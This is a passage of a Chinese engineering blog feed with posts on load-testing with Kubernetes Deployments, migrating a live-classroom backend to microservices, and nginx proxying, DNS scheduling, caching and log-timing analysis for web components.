<h2 id="3-实践与扩展"><a href="#3-实践与扩展" class="headerlink" title="3. 实践与扩展"></a>3. 实践与扩展</h2><p>由于 k8s 可以方便的做扩容，所以在执行压测程序时特别方便，这里给出一个在 k8s 中做打压的实例。由于性能测试非常消耗机器资源，请不要在 okteto 上尝试，否则容易封号。</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1 <span class="token comment">#与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本</span>
<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment <span class="token comment">#该配置的类型，我们使用的是 Deployment</span>
<span class="token key atrule">metadata</span><span class="token punctuation">:</span> <span class="token comment">#译名为元数据，即 Deployment 的一些基本属性和信息</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> hello<span class="token punctuation">-</span>deployment <span class="token comment">#Deployment 的名称</span>
  <span class="token key atrule">labels</span><span class="token punctuation">:</span> <span class="token comment">#标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> hello <span class="token comment">#为该Deployment设置key为app，value为nginx的标签</span>
<span class="token key atrule">spec</span><span class="token punctuation">:</span> <span class="token comment">#这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用</span>
  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">1</span> <span class="token comment">#使用该Deployment创建一个应用程序实例</span>
  <span class="token key atrule">selector</span><span class="token punctuation">:</span> <span class="token comment">#标签选择器，与上面的标签共同作用，目前不需要理解</span>
    <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span> <span class="token comment">#选择包含标签app:nginx的资源</span>
      <span class="token key atrule">app</span><span class="token punctuation">:</span> hello
  <span class="token key atrule">template</span><span class="token punctuation">:</span> <span class="token comment">#这是选择或创建的Pod的模板</span>
    <span class="token key atrule">metadata</span><span class="token punctuation">:</span>
      <span class="token key atrule">name</span><span class="token punctuation">:</span> hello<span class="token punctuation">-</span>app
      <span class="token key atrule">labels</span><span class="token punctuation">:</span>
        <span class="token key atrule">app</span><span class="token punctuation">:</span> hello
    <span class="token key atrule">spec</span><span class="token punctuation">:</span>
      <span class="token key atrule">initContainers</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token key atrule">image</span><span class="token punctuation">:</span> busybox
        <span class="token key atrule">command</span><span class="token punctuation">:</span>
        <span class="token punctuation">-</span> sh
        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c
        <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">
          sysctl -w net.core.somaxconn=10240
          sysctl -w net.ipv4.ip_local_port_range="1024 65535"
          sysctl -w net.ipv4.tcp_tw_reuse=1
          sysctl -w fs.file-max=6048576</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> setsysctl
        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span>
          <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
      <span class="token key atrule">containers</span><span class="token punctuation">:</span>
        <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> hello<span class="token punctuation">-</span>app
          <span class="token key atrule">image</span><span class="token punctuation">:</span> registry.cn<span class="token punctuation">-</span>hangzhou.aliyuncs.com/whyun/base<span class="token punctuation">:</span>hello<span class="token punctuation">-</span>latest
          <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> Always
          <span class="token key atrule">resources</span><span class="token punctuation">:</span>
            <span class="token key atrule">requests</span><span class="token punctuation">:</span>
              <span class="token key atrule">cpu</span><span class="token punctuation">:</span> 1000m
              <span class="token key atrule">memory</span><span class="token punctuation">:</span> 2Gi
            <span class="token key atrule">limits</span><span class="token punctuation">:</span>
              <span class="token key atrule">cpu</span><span class="token punctuation">:</span> 1000m
              <span class="token key atrule">memory</span><span class="token punctuation">:</span> 3Gi
          <span class="token key atrule">env</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> test
              <span class="token key atrule">value</span><span class="token punctuation">:</span> <span class="token string">"1"</span>

<span class="token punctuation">---</span>
<span class="token key atrule">kind</span><span class="token punctuation">:</span> Service
<span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1
<span class="token key atrule">metadata</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> hello<span class="token punctuation">-</span>service
<span class="token key atrule">spec</span><span class="token punctuation">:</span>
  <span class="token key atrule">selector</span><span class="token punctuation">:</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> hello
  <span class="token key atrule">ports</span><span class="token punctuation">:</span>
    <span class="token punctuation">-</span> <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8000</span> <span class="token comment"># Default port for image</span>


<span class="token punctuation">---</span>
<span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1 <span class="token comment">#与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本</span>
<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment <span class="token comment">#该配置的类型，我们使用的是 Deployment</span>
<span class="token key atrule">metadata</span><span class="token punctuation">:</span> <span class="token comment">#译名为元数据，即 Deployment 的一些基本属性和信息</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> bench<span class="token punctuation">-</span>deployment <span class="token comment">#Deployment 的名称</span>
  <span class="token key atrule">labels</span><span class="token punctuation">:</span> <span class="token comment">#标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> bench <span class="token comment">#为该Deployment设置key为app，value为nginx的标签</span>
<span class="token key atrule">spec</span><span class="token punctuation">:</span> <span class="token comment">#这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用</span>
  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">6</span> <span class="token comment">#使用该Deployment创建一个应用程序实例</span>
  <span class="token key atrule">selector</span><span class="token punctuation">:</span> <span class="token comment">#标签选择器，与上面的标签共同作用，目前不需要理解</span>
    <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span> <span class="token comment">#选择包含标签app:nginx的资源</span>
      <span class="token key atrule">app</span><span class="token punctuation">:</span> bench
  <span class="token key atrule">template</span><span class="token punctuation">:</span> <span class="token comment">#这是选择或创建的Pod的模板</span>
    <span class="token key atrule">metadata</span><span class="token punctuation">:</span>
      <span class="token key atrule">name</span><span class="token punctuation">:</span> bench<span class="token punctuation">-</span>node
      <span class="token key atrule">labels</span><span class="token punctuation">:</span>
        <span class="token key atrule">app</span><span class="token punctuation">:</span> bench
    <span class="token key atrule">spec</span><span class="token punctuation">:</span>
      <span class="token key atrule">initContainers</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token key atrule">image</span><span class="token punctuation">:</span> busybox
        <span class="token key atrule">command</span><span class="token punctuation">:</span>
        <span class="token punctuation">-</span> sh
        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c
        <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">
          sysctl -w net.core.somaxconn=10240
          sysctl -w net.ipv4.ip_local_port_range="1024 65535"
          sysctl -w net.ipv4.tcp_tw_reuse=1
          sysctl -w fs.file-max=1048576</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> setsysctl
        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span>
          <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
      <span class="token key atrule">containers</span><span class="token punctuation">:</span>
        <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> bench<span class="token punctuation">-</span>node
          <span class="token key atrule">image</span><span class="token punctuation">:</span> registry.cn<span class="token punctuation">-</span>hangzhou.aliyuncs.com/whyun/base<span class="token punctuation">:</span>node<span class="token punctuation">-</span>bench<span class="token punctuation">-</span>0.2.0
          <span class="token key atrule">env</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> REQ_URL
              <span class="token key atrule">value</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//hello<span class="token punctuation">-</span>service<span class="token punctuation">:</span>8000/
            <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> REQ_INTERVAL_MS
              <span class="token key atrule">value</span><span class="token punctuation">:</span> <span class="token string">"5"</span>
            <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> REQ_TIMEOUT_MS
              <span class="token key atrule">value</span><span class="token punctuation">:</span> <span class="token string">"20"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 3.1 node-bench.yaml</strong></p>
<p>从肉眼上看，明显看的出来上述代码比较长，而且中间会有 <code>---</code> 分隔符，这是 yaml 文件中固有语法，可以用来分割多个配置。</p>
<p>注意在 <code>spec.template.spec</code> 属性下的 <code>initContainers</code> 属性都被我们注释掉了，原因会在下面解释，先介绍一下它的作用，它一般用来执行一些初始化操作的命令，运行完成后就退出。这里可以指定若干初始化容器，按照顺序指定，初始化容器都执行完成后，才会轮到应用容器启动。不过这里我们使用 initContainers 的一个重要原因，还在于我们需要修改操作系统内核参数，这在普通容器中是做不到的。但是正是由于我们要修改内核参数，需要 k8s 本身开放权限，否则无法修改成功。</p>
<p>同时还新增了  <code>spec.template.spec.containers[0].env</code> 属性，用来指定容器启动时的环境变量。它比 Dockerfile 中的 ENV 指定定义的环境变量要高。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>本文代码 <a href="https://gitlab.com/yunnysunny/k8s-learn">https://gitlab.com/yunnysunny/k8s-learn</a></p>
<p>本文中引用的部分镜像代码来源于 <a href="https://github.com/yunnysunny/dockerfiles">https://github.com/yunnysunny/dockerfiles</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>Load balancing and scaling long-lived connections in Kubernetes <a href="https://learnk8s.io/kubernetes-long-lived-connections">https://learnk8s.io/kubernetes-long-lived-connections</a></li>
</ul>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>K8s</category>
      </categories>
  </entry>
  <entry>
    <title>微服务改造心路历程</title>
    <url>/posts/micro-reform-milestones/</url>
    <content><![CDATA[<h2 id="1-改造前现状"><a href="#1-改造前现状" class="headerlink" title="1. 改造前现状"></a>1. 改造前现状</h2><p>直播间逻辑服务，包含了直播间内答题互动、聊天、抢红包等消息的逻辑处理。刚开始设计的时候，所有的消息混在一起处理，后来为了给优先级高的请求让路，逻辑服务后期根据消息类型拆分成了三类服务，很长一段时间内逻辑服务的拓扑结构是这样的：</p>
<p><img src="/images/current_service_cell.png"></p>
<p><strong>图 1.1 基于优先级的服务拓扑结构</strong></p>
<p>不过随着业务的深入发展，具体到某一个消息类型的处理流程可能会越来越复杂。拿答题上报来说，我们第一版的流程是这样的：</p>
<p><img src="/images/answer_report_flow1.png"></p>
<p><strong>图 1.2 第一版的答题上报流程</strong></p>
<p>不过随着后期需求的改进增加了以班组为单位的答题正确率的排行榜、学生在班组内的答题时间排行榜、学生在直播间内的答题时间排行榜等需求，流程图就变成了这个样子：</p>
<p><img src="/images/answer_report_flow2.png"></p>
<p><strong>图 1.3 第二版答题上报流程</strong></p>
<p>最近答题的需求还要进行改进，增加诸如给连续答对的用户打标签的逻辑，这样最终演变的逻辑将会比 <strong>图 1.3</strong> 中的流程更加复杂，这样就会导致答题处理的后端代码越来越臃肿，难以为继。</p>
<h2 id="2-初步改造方案"><a href="#2-初步改造方案" class="headerlink" title="2. 初步改造方案"></a>2. 初步改造方案</h2><p>重新分析一下答题上报流程，以上报者的视角来看，其实只关心上报是否成功，至于各个选项、各种人数的统计，上报者自身并不关心。将上报流程再次进行一次抽象，那么数据处理的答题分为两类：一类是学生自己关心的，比如说是否重复答题、同班同学都在学的提示语；一类是老师关心的，比如说各种统计。根据这个思路我们可以在答题流程中仅仅处理学生关心的流程，然后将统计处理丢到另外一个服务中进行处理。基于这个思想对现有服务拓扑结构做改造：</p>
<p><img src="/images/future_service_cell.png"></p>
<p><strong>图 2.1 未来的服务器拓扑结构</strong></p>
<h2 id="3-演进过程"><a href="#3-演进过程" class="headerlink" title="3. 演进过程"></a>3. 演进过程</h2><p>首先的挑战是重构带来的时间成本，第二个就是新增服务后，维护成本会上升。同时由于对微服务的理解不是很完善，当中也历经了几次比较大的改进过程。</p>
<h3 id="3-1-全部使用消息队列进行通信"><a href="#3-1-全部使用消息队列进行通信" class="headerlink" title="3.1 全部使用消息队列进行通信"></a>3.1 全部使用消息队列进行通信</h3><p><img src="/images/all_kafka.png"></p>
<p><strong>图 3.1.1</strong></p>
<blockquote>
<p>图中 logical 代表逻辑服务，micro 代表微服务，下同。</p>
</blockquote>
<p>由于做微服务的初衷是将可以异步处理的部分抽离出来，所以很容易想到的就是在 logical 和 micro 之间假设一个消息队列。考虑一个答题连对的场景</p>
<p><img src="/images/right_continue_flow.png"></p>
<p><strong>图 3.1.2</strong></p>
<p>一个老师触发答题时，logical 服务要做三个动作，发送开始答题消息到micro、给老师端答题响应、广播消息给学生，学生端收到广播后进行答题，如果答题正确服务器端会下发连对的提醒。正常情况下，这个时序是没有问题的，但是由于我们 logical 和 micro 之间使用的是异步通信，理论上 <code>2.1</code> 和 <code>2.3</code> 的时序是不能得到保证的。这个服务在上线后也遇到了问题，在极小概率下，用户答对了题，但是连对却没有出现，究其原因就是因为 <code>2.1</code>这一步出现了延迟。</p>
<h3 id="3-2-引入-RPC"><a href="#3-2-引入-RPC" class="headerlink" title="3.2 引入 RPC"></a>3.2 引入 RPC</h3><p>将 <code>2.1</code> 步做成带有事务的 grpc 调用，等待当前调用返回数据时，再触发 <code>2.2</code> 和 <code>2.3</code> 步。这样解决了异步操作没有事务的问题。看上去一切都很完美了，但是随着业务的迭代，微服务越来越多，可能老师端做一个操作的时候，流程变成这样。</p>
<p><img src="/images/add_rpc.png"></p>
<p><strong>图 3.2.1 引入rpc</strong></p>
<p>细品这个流程，其实跟 <strong>图 1.3</strong> 会面临同样的问题，请求处理函数代码会越写越长，最终难以维护。</p>
<h3 id="3-3-引入消息总线"><a href="#3-3-引入消息总线" class="headerlink" title="3.3 引入消息总线"></a>3.3 引入消息总线</h3><p>后来总结了一下，一个上行消息到达后，我们通知各个微服务的请求的数据内容其实是相同的，这时候其实可以直接引入一条消息总线，会让代码简洁很多。微服务只需要监听自己关心的消息总线即可。</p>
<p><img src="/images/add_event_bus.png"></p>
<p><strong>图 3.3.1</strong></p>
<p>不过这样同样会导致一个问题，就是数据流重新回到了类似使用消息队列的模式，所有的 logical 和 micro 之间的通信又变成了异步的了。目前解决的方法就是在微服务端增加 <strong>待处理</strong> 队列，如果在一个事务中学生的消息先到，就先先加入待处理带队中，等待老师的消息到来后，一并处理。</p>
]]></content>
      <categories>
        <category>Micro Service</category>
      </categories>
  </entry>
  <entry>
    <title>微服务在前端的落地</title>
    <url>/posts/micro-for-frontend/</url>
    <content><![CDATA[<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><h3 id="1-1-试水"><a href="#1-1-试水" class="headerlink" title="1.1 试水"></a>1.1 试水</h3><p>公司的 PC 客户端的起先所有的 UI 界面都是 QT 开发，但是随着业务的深入，需求方对于数据展示的需求越来越强烈，但是使用 QT 代码做这种强 UI 的渲染会比较繁琐，所以 PC 客户端引入了内嵌网页来做数据展示。我们这里称这些内嵌网页为 Web 组件。</p>
<h4 id="1-1-1-演进"><a href="#1-1-1-演进" class="headerlink" title="1.1.1 演进"></a>1.1.1 演进</h4><p>PC 客户端和服务器端之间的通信要依赖于长连接，使用原生代码编写 UI 时，直接在使用原生代码建立长连接即可，但是使用 Web 组件之后，无法再新增长连接，否则会出现同一个用户长连接互踢的问题，所以 Web 组件是借用原生端已经建立好的长连接进行通信。</p>
<p><img src="/images/widget_proxy_via_native.png"></p>
<p><strong>图 1.1.1.1 Web 组件通过原生代理通信</strong></p>
<p>不过随着业务的发展，增加的 Web 组件也越来越多，最终整体的总览就变成下面这个样子：</p>
<p><img src="/images/mutil-proxy.png"></p>
<p><strong>图 1.1.1.2 Web 组件通信拓扑图</strong></p>
<p>长连接处在整个架构中心的位置，根据以往的经验看，有中心就会有依赖，仔细考虑当前这条长连接还是有很多弊端的，比如说：</p>
<ol>
<li>挤占原生进程的资源，原生程序为了维护Web组件通信的信道必须额外维护上下文。</li>
<li>增加了程序开发调试的复杂度，因为依赖于原生端的 js 调用，所以 web 端的程序必须嵌入到原生应用中才能运行。</li>
</ol>
<p>既然中心化是有缺陷的，那么最直接解决方案就是去中心化，鉴于长连接的维护成本较高，为了的解决方案中会采用短链接的架构：</p>
<p><img src="/images/widget-short.png"></p>
<p><strong>图 1.1.1.3 Web 组件使用短连接</strong></p>
<p>从这里开始引入了微服务的概念，每个微服务负责独立的一个功能，与其对应的 Web 组件也相对独立。起初设计此架构是为了解决 PC 客户端的问题，后来此架构也延申到了移动 APP 端和网页端。</p>
<h3 id="1-2-域名"><a href="#1-2-域名" class="headerlink" title="1.2 域名"></a>1.2 域名</h3><p><strong>图 1.1.1.3</strong> 中画了若干个 Web 组件，每个对应的都是不同的后端微服务，如果每次创建一个微服务都申请一个域名会对维护带来巨大的挑战。所以这个地方在设计的时候，所有的微服务采用同样一个域名，这里记这个域名为 micro-default。然后客户端在请求的时候，在请求路径前面添加微服务的标识，那么前置的域名解析 nginx 在做反代配置的时候，就可以做类似如下配置：</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span></span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">server_name</span> micro-default</span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">location</span> /service_name_of_one_micro/</span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">rewrite</span> ^/service_name_of_one_micro/(.*) /<span class="token variable">$1</span> break</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_pass</span> http://the_addr_of_current_micro_service</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_cache</span> my_cache</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">add_header</span> X-Cache-Status <span class="token variable">$upstream_cache_status</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$http_host</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Scheme <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.1</strong></p>
<h2 id="2-存在问题"><a href="#2-存在问题" class="headerlink" title="2. 存在问题"></a>2. 存在问题</h2><h3 id="2-1-智能-DNS-解析不均衡"><a href="#2-1-智能-DNS-解析不均衡" class="headerlink" title="2.1 智能 DNS 解析不均衡"></a>2.1 智能 DNS 解析不均衡</h3><h4 id="2-1-0-问题描述"><a href="#2-1-0-问题描述" class="headerlink" title="2.1.0 问题描述"></a>2.1.0 问题描述</h4><p>端上访问服务器的默认域名是 micro-default 这个域名，它是做了动态 DNS 解析，会根据用户的运营商的 DNS 来决定解析到哪里去</p>
<p><img src="/images/micro-all-domain.png"></p>
<p><strong>图 2.1</strong></p>
<p>DNS 服务会根据用户上网设备用的 DNS 地址归属地来决定往哪调度，如果识别不出来就默认网北京节点调度，但是大部分用户的所用 DNS 地址的地址不被 DSN 服务所识别（比如说很多用户用的是 114 的DNS），所以就直接走默认值了。</p>
<p>这样导致的问题是，虽然我们有三个入口点，但是 80% 的流量集中到北京节点了，另外两个节点空闲，好在当前的 http 流量并不大，北京的入口点高峰期间占用的资源也很小。</p>
<h4 id="2-1-1-解决方案"><a href="#2-1-1-解决方案" class="headerlink" title="2.1.1 解决方案"></a>2.1.1 解决方案</h4><h5 id="2-1-1-1-市面上的解决方案"><a href="#2-1-1-1-市面上的解决方案" class="headerlink" title="2.1.1.1 市面上的解决方案"></a>2.1.1.1 市面上的解决方案</h5><p><a href="https://zh.wikipedia.org/wiki/DNS_over_HTTPS"><strong>D</strong>NS <strong>O</strong>ver <strong>h</strong>ttps</a>，使用 https 请求来代替传统 DNS 请求，根据请求者的出口 IP 可以精确的确定地理位置</p>
<p>举个例子，阿里 DNS，</p>
<p><a href="https://dns.alidns.com/dns-query">https://dns.alidns.com/dns-query</a></p>
<p><a href="https://223.5.5.5/dns-query">https://223.5.5.5/dns-query</a><br><a href="https://223.6.6.6/dns-query">https://223.6.6.6/dns-query</a><br>https:&#x2F;&#x2F;[2400:3200::1]&#x2F;dns-query<br>https:&#x2F;&#x2F;[2400:3200:baba::1]&#x2F;dns-query  </p>
<p>不过这种技术需要用户自己单独在电脑上做配置，起码在电脑端当前解决方案实现起来不现实。</p>
<h5 id="2-1-1-2-自建解决方案"><a href="#2-1-1-2-自建解决方案" class="headerlink" title="2.1.1.2 自建解决方案"></a>2.1.1.2 自建解决方案</h5><p>移动 APP 端或者 PC 客户端由于可以自行修改请求的 HTTP 数据包，所以可以在触发 http 请求之前，会尝试将域名发送一个调度接口，该接口能够返回后端配置过根据用户请求 IP 映射的服务器 IP，记为 <code>IPX</code>。如果 <code>IPX</code>存在，则使用这个 IP 去请求服务器端；否则就回退到传统的 DNS 解析模式。</p>
<p><img src="/images/dns_proxy.png"></p>
<p><strong>图 2.1.1.2</strong></p>
<p>如果是浏览器端，则无法直接使用返回的 IP 地址来构建 https 请求，除非当前服务器的数字证书直接绑定在 IP 上，这种数字证书比较贵，一般公司不会购买。那么在上图第 2 步的时候，可以直接返回一个子域名来来解决，也就是说对于 <strong>图2.1</strong> 的每个 SLB 的 IP 都映射一个子域名。 </p>
<h3 id="2-2-客户端缓存"><a href="#2-2-客户端缓存" class="headerlink" title="2.2 客户端缓存"></a>2.2 客户端缓存</h3><h4 id="2-2-0-问题描述"><a href="#2-2-0-问题描述" class="headerlink" title="2.2.0 问题描述"></a>2.2.0 问题描述</h4><p>同时留意到如果系统中存在集中跳转的情况出现，在短时间内就会有高并发查询接口的情况出现，下图是一个具体微服务请求日志的kibana统计，显示1ms发生了3000个并发请求，而这三千个请求都是同一个查询接口。</p>
<p><img src="/images/3k_req_per_ms.png"></p>
<p><strong>图 2.2.0.1 1ms 3000请求</strong></p>
<h4 id="2-2-1-解决方案"><a href="#2-2-1-解决方案" class="headerlink" title="2.2.1 解决方案"></a>2.2.1 解决方案</h4><h5 id="2-2-1-1-市面方案"><a href="#2-2-1-1-市面方案" class="headerlink" title="2.2.1.1 市面方案"></a>2.2.1.1 市面方案</h5><p>在前置节点做文章（更多的称之为<a href="https://baike.baidu.com/item/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/9044985">边缘计算</a>），即使后端 http 服务是非静态资源，依然可以在前置节点做文章，将请求缓存在前置节点。</p>
<p><img src="/images/edge_cloud.jpg"></p>
<p><strong>图 2.2.1.1.1</strong></p>
<p>市面上常见的产品有<a href="https://www.aliyun.com/product/dcdn?spm=5176.19720258.J_8058803260.60.e9392c4a3ANYHn">阿里云DCDN</a> <a href="https://www.nginx.com/products/nginx/">nginx plus</a> <a href="https://openresty.com/en/edge/">openresty edge</a></p>
<h5 id="2-2-1-2-自建解决方案"><a href="#2-2-1-2-自建解决方案" class="headerlink" title="2.2.1.2 自建解决方案"></a>2.2.1.2 自建解决方案</h5><p>跟市面上的服务器的处理原理一样，只不过我们只关心缓存处理，具体缓存协商流程分析</p>
<p><img src="/images/front_cache_server.png"></p>
<p>可以看出来，前置节点像一个漏洞，将本来请求到机房的流量给拦截了一部分，流量拦截量的多少，就取决于机房里面的服务设置的缓存时间的长短（记为 <strong>CACHE-A</strong>）。同时前置节点和客户端之间还有缓存时长约定(记为 <strong>CACHE-B</strong>)，这个约定可以规范客户端的请求间隔时长，让客户端不要在短时间内发送过多的请求到前置节点。理论上讲，客户端端最终拿到数据的滞后时间为 **max(CACHE-A, CACHE-B)**。</p>
<h2 id="3-性能问题排查"><a href="#3-性能问题排查" class="headerlink" title="3. 性能问题排查"></a>3. 性能问题排查</h2><p>在 nginx 的访问日志中可以配置如下几个字段：request_time upstream_connect_time upstream_header_time upstream_response_time，这几个字段的意义如下图所示：</p>
<blockquote>
<p>参考配置代码</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">log_format</span> json <span class="token string">'&#123;"@timestamp":"<span class="token variable">$time_iso8601</span>",'</span>
          <span class="token string">'"server_addr":"<span class="token variable">$server_addr</span>",'</span>
          <span class="token string">'"client":"<span class="token variable">$remote_addr</span>",'</span>
          <span class="token string">'"method":"<span class="token variable">$request_method</span>",'</span>
          <span class="token string">'"request":"<span class="token variable">$request</span>",'</span>
          <span class="token string">'"request_length":<span class="token variable">$request_length,</span>'</span>
          <span class="token string">'"status":<span class="token variable">$status</span>,'</span>
          <span class="token string">'"bytes_sent":<span class="token variable">$bytes_sent,</span>'</span>
          <span class="token string">'"body_bytes_sent":<span class="token variable">$body_bytes_sent,</span>'</span>
          <span class="token string">'"http_referer":"<span class="token variable">$http_referer</span>",'</span>
          <span class="token string">'"http_user_agent":"<span class="token variable">$http_user_agent</span>",'</span>
          <span class="token string">'"upstream_addr":"<span class="token variable">$upstream_addr</span>",'</span>
          <span class="token string">'"upstream_status":"<span class="token variable">$upstream_status</span>",'</span>
          <span class="token string">'"request_time":<span class="token variable">$request_time,</span>'</span>
          <span class="token string">'"upstream_response_time":"<span class="token variable">$upstream_response_time</span>",'</span>
          <span class="token string">'"upstream_connect_time":"<span class="token variable">$upstream_connect_time</span>",'</span>
          <span class="token string">'"upstream_header_time":"<span class="token variable">$upstream_header_time</span>",'</span>
          <span class="token string">'"remote_user":"<span class="token variable">$remote_user</span>",'</span>
          <span class="token string">'"http_host":"<span class="token variable">$host</span>",'</span>
          <span class="token string">'"url":"<span class="token variable">$uri</span>",'</span>
          <span class="token string">'"xff":"<span class="token variable">$http_x_forwarded_for</span>"&#125;'</span></span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">log_format</span> main</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</blockquote>
<p><img src="/images/nginx_timings.png"></p>
<p><strong>图 4.1</strong></p>
<p>典型问题分析：</p>
<p>情景1</p>
<p><img src="/images/conn_timeout.png"></p>
<p><strong>图 4.2</strong></p>
<p>upstream_connect_time ≈ upstream_header_time ≈ upstream_response_time ≈ request_time</p>
<p>时间耗费在跟后端服务器建连上，说明专线带宽不稳定（小概率），或者单位时间内并发过大（大概率，目前反向代理使用的http 1.0，容易出现这种问题）</p>
<p>情景二</p>
<p><img src="/images/res_timeout.png"></p>
<p><strong>图 4.3</strong></p>
<p>upstream_connect_time &lt;&lt; upstream_header_time ≈ upstream_response_time</p>
<p>时间耗费在后端服务处理上</p>
<p>情景三</p>
<p><img src="/images/client_timeout.png"></p>
<p><strong>图 4.4</strong></p>
<p>upstream_connect_time ≈ upstream_header_time ≈ upstream_response_time &lt;&lt; request_time</p>
<p>时间耗费在客户端数据读写上或者 客户端和 nginx 建连上，由于目前nginx版本比较低，nginx建连时间暂时取不到，但是这种情况出现的概率很低，大概率是耗费在读写客户端数据上。</p>
<blockquote>
<p>严格意义讲，request_time 不是客户端请求的真正时间，从客户端测观察的时间要比这个时间稍大。极端情况下会有大的偏差，因为客户端网卡满载情况下，服务器端网络层写入的数据有可能会被客户端丢包，继而会引发重传，耗费大量的时间，这部分时间在服务器端是没法记录的。</p>
</blockquote>
]]></content>
      <categories>
        <category>Micro Service</category>
        <category>Engineering Design</category>
      </categories>
  </entry>
  <entry>
    <title>js异步之惑</title>
    <url>/posts/js/</url>
